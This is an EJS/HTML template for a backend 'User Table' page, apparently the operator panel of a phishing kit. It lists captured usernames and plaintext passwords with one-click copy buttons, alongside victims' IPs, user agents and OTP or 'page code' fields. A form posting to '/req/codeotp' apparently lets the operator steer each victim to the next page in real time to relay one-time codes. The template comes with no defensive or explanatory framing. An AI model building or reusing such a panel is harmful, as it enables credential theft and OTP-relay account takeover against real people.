<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Table</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background-color: #cceeff;
      margin: 20px;
      color: #000;
    }

    h1 {
      text-align: center;
      margin-bottom: 25px;
      font-weight: 600;
    }

    /* Home button styled like before */
    a {
      display: inline-block;
      text-decoration: none;
      background-color: #ffffff;
      color: #0077cc;
      padding: 10px 18px;
      border-radius: 6px;
      font-weight: 600;
      margin-bottom: 20px;
      transition: all 0.3s ease;
    }

    a:hover {
      background-color: #cceeff;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      background: white;
      box-shadow: 0 5px 20px rgba(0,0,0,0.15);
      border-radius: 10px;
      overflow: hidden;
    }

    th, td {
      border: 1px solid #ddd;
      padding: 10px;
      text-align: center;
      transition: background-color 0.3s;
    }

    th {
      background-color: #027e1b;
      color: white;
    }

    /* New data row (notify == 0) */
    .new-entry {
      background-color: #c80000 !important;
      color: white;
    }

    /* Updated data row (notify == 2) */
    .confirmed-entry {
      background-color: #1d75aa !important;
      color: white;
    }

    /* Cursor hover turns cell green highlight */
    tr:hover td {
      background-color: #0a3bfb00 !important;
      color: black !important;
    }

    /* Inline button style */
    .inline-button-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    /* Copy button dark yellow */
    .inline-button-container button {
      background-color: #b38f00;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 4px 8px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .inline-button-container button:hover {
      background-color: #997a00;
    }

    input[type="text"] {
      border: 1px solid #0077cc;
      border-radius: 4px;
      padding: 5px;
      background-color: white;
      color: black;
      width: 100px;
      transition: 0.3s;
    }

    input[type="text"]:focus {
      background-color: #009933;
      border: 2px solid #009933;
      color: white;
      outline: none;
    }

    input[name="update"] {
      background-color: #003366;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 6px 10px;
      cursor: pointer;
    }

    input[name="update"]:hover {
      background-color: #001f4d;
    }

    input[name="done"] {
      background-color: #e6b800;
      color: black;
      border: none;
      border-radius: 4px;
      padding: 6px 10px;
      cursor: pointer;
    }

    input[name="done"]:hover {
      background-color: #cc9900;
    }
  </style>

  <script>
    function copyToClipboard(event, text) {
      event.preventDefault();
      const tempTextArea = document.createElement("textarea");
      tempTextArea.value = text;
      document.body.appendChild(tempTextArea);
      tempTextArea.select();
      document.execCommand("copy");
      document.body.removeChild(tempTextArea);

      // Toast message
      const toast = document.createElement("div");
      toast.textContent = "Copied!";
      toast.style.position = "fixed";
      toast.style.bottom = "20px";
      toast.style.right = "20px";
      toast.style.background = "#b38f00";
      toast.style.color = "white";
      toast.style.padding = "8px 14px";
      toast.style.borderRadius = "6px";
      document.body.appendChild(toast);
      setTimeout(() => toast.remove(), 1000);
    }
  </script>
</head>
<body>
  <div style="text-align:center;">
    <a href="/backend">üè† Back to Home</a>
  </div>

  <h1>User Table</h1>

  <table id="myTable">
    <tr>
      <th>ID</th>
      <th>Username</th>
      <th>Password</th>
      <th>IP</th>
      <th>User Agent</th>
      <th>Date</th>
      <th>Page Code / OTP</th>
      <th>Mobile Name / CODE</th>
      <th>Notify</th>
      <th colspan="2">Action</th>
    </tr>

    <% rows.forEach((row, index) => { %>
      <tr class="<% if (row.notify == '0') { %>new-entry<% } else if (row.notify == '2') { %>confirmed-entry<% } %>">
        <form action="/req/codeotp" method="POST">
          <td><%= index + 1 %></td>
          <td>
            <div class="inline-button-container">
              <%= row.username %>
              <button onclick="copyToClipboard(event, '<%= row.username %>')">üìã</button>
              <input type="hidden" name="username" value="<%= row.username %>">
            </div>
          </td>
          <td>
            <div class="inline-button-container">
              <%= row.password %>
              <button onclick="copyToClipboard(event, '<%= row.password %>')">üìã</button>
            </div>
          </td>
          <td><%= row.ip %></td>
          <td><%= row.useragent %></td>
          <td><%= row.date %></td>
          <td><input type="text" name="page" value="<%= row.pagetype %>"></td>
          <td><input type="text" name="mobile" value="<%= row.mobiletype %>"></td>
          <td><%= row.notify %></td>
          <td><input type="submit" name="update" value="Update"></td>
          <td><input type="submit" name="done" value="Done"></td>
        </form>
      </tr>
    <% }); %>
  </table>
</body>
</html>
